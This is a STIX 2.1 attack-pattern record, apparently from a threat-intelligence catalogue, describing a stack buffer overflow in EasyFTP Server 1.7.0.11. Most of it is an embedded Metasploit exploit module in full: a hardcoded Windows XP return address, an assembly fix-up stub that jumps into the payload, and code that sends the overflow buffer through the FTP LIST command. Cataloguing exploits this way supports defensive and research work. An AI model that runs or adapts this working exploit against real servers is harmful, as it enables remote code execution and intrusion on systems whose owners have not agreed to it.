{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f2f68a6-0735-46be-a0a8-b35ab534866f",
    "created": "2024-08-14T16:51:27.372383Z",
    "modified": "2024-08-14T16:51:27.372387Z",
    "name": "EasyFTP Server LIST Command Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11. credit goes to Karn Ganeshan.  NOTE: Although, this is likely to exploit the same vulnerability as the 'easyftp_cwd_fixret' exploit, it uses a slightly different vector. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/easyftp_list_fixret.rb",
            "external_id": "easyftp_list_fixret.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# EDB-ID: 14400\n# Date : July 5, 2010\n# Discovered by : Karn Ganeshen\n# Version : 1.7.0.11\n# Tested on : Windows XP SP3 Version 2002\n# MFR  & VAS TEAM : just testing howto convert exploits to metasploit modules.\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EasyFTP Server LIST Command Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11.\n        credit goes to Karn Ganeshan.\n\n        NOTE: Although, this is likely to exploit the same vulnerability as the\n        'easyftp_cwd_fixret' exploit, it uses a slightly different vector.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshan <karnganeshan[at]gmail.com>', # original version\n          'MFR',    # convert to metasploit format.\n          'jduck'   # modified to use fix-up stub (works with bigger payloads)\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '62134' ],\n          [ 'EDB', '14400' ],\n          [ 'EDB', '14451' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x2f\\x5c\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 - Version 2002',   { 'Ret' => 0x7e49732b } ], # call edi from user32.dll (v5.1.2600.5512)\n        ],\n      'DisclosureDate' => '2010-07-05',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /BigFoolCat/)\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_login\n\n    # NOTE:\n    # This exploit jumps to edi, which happens to point at a partial version of\n    # the 'buf' string in memory. The fixRet below fixes up the code stored on the\n    # stack and then jumps there to execute the payload. The value in esp is used\n    # with an offset for the fixup.\n    fixRet_asm = %q{\n      mov edi,esp\n      mov [edi], 0xfeedfed5\n      add edi, 0xfffffff4\n      mov byte ptr [edi], 0xc0\n      add edi,4\n      mov [edi], 0xdeadbeef\n      add edi, 0xffffff24\n      add esp, 0xfffffe04\n      jmp edi\n    }\n    fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, fixRet_asm).encode_string\n\n    buf = ''\n\n    print_status(\"Prepending fixRet...\")\n    buf << fixRet\n    buf << make_nops(0x30 - buf.length)\n\n    print_status(\"Adding the payload...\")\n    buf << payload.encoded\n\n    # Patch the original stack data into the fixer stub\n    buf[4, 4] = buf[268 + 8, 4]\n    buf[16, 1] = buf[268-4, 1]\n    buf[22, 4] = buf[268, 4]\n\n    print_status(\"Overwriting part of the payload with target address...\")\n    buf[268,4] = [target.ret].pack('V') # put return address @ 268 bytes\n\n    print_status(\"Sending exploit buffer...\")\n    send_cmd( ['LIST', buf] , false)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-05",
    "x_mitre_platforms": [
        "win'"
    ]
}